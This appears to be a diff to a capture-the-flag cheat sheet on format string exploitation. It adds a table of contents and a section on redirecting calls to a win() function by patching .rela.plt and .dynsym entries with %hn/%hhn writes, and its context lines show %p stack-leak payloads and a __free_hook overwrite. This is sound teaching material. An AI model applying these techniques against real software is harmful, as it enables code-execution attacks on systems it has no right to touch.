@@ -1,5 +1,16 @@
 # CTF Pwn - Format String Exploitation
 
+## Table of Contents
+- [Format String Basics](#format-string-basics)
+- [Argument Retargeting (Non-Positional %n Trick)](#argument-retargeting-non-positional-n-trick)
+- [Blind Pwn (No Binary Provided)](#blind-pwn-no-binary-provided)
+- [Format String with Filter Bypass](#format-string-with-filter-bypass)
+- [Format String Canary + PIE Leak](#format-string-canary-pie-leak)
+- [__free_hook Overwrite via Format String (glibc < 2.34)](#__free_hook-overwrite-via-format-string-glibc-234)
+- [.rela.plt / .dynsym Patching](#relaplt-dynsym-patching)
+
+---
+
 ## Format String Basics
 
 - Leak stack: `%p.%p.%p.%p.%p.%p`
@@ -212,3 +223,23 @@ p.sendline(b'cat flag')  # free() → system("cat flag")
 ```
 
 **When to use:** Full RELRO (no GOT overwrite) + glibc < 2.34 (hooks still exist). For glibc >= 2.34, hooks are removed - target return addresses or `_IO_FILE` structs instead.
+
+## .rela.plt / .dynsym Patching
+
+**When to use:** GOT addresses contain bad bytes (e.g., 0x0a with fgets), making direct GOT overwrite impossible. Requires `.rela.plt` and `.dynsym` in writable memory.
+
+**Technique:** Patch `.rela.plt` relocation entry symbol index to point to different symbol, then patch `.dynsym` symbol's `st_value` with `win()` address. When the original function is called, dynamic linker reads patched relocation and jumps to `win()`.
+
+```python
+# Key addresses (from readelf -S)
+REL_SYM_BYTE = 0x4006ec   # .rela.plt[exit].r_info byte containing symbol index
+STDOUT_STVAL_LO = 0x4004e8  # .dynsym[11].st_value low halfword
+STDOUT_STVAL_HI = 0x4004ea  # .dynsym[11].st_value high halfword
+
+# Format string writes via %hhn (8-bit) and %hn (16-bit)
+# 1. Write symbol index 0x0b to r_info byte
+# 2. Write win() address low halfword to st_value
+# 3. Write win() address high halfword to st_value+2
+```
+
+**When GOT has bad bytes but .rela.plt/.dynsym don't:** This technique bypasses all GOT byte restrictions since you never write to GOT directly.
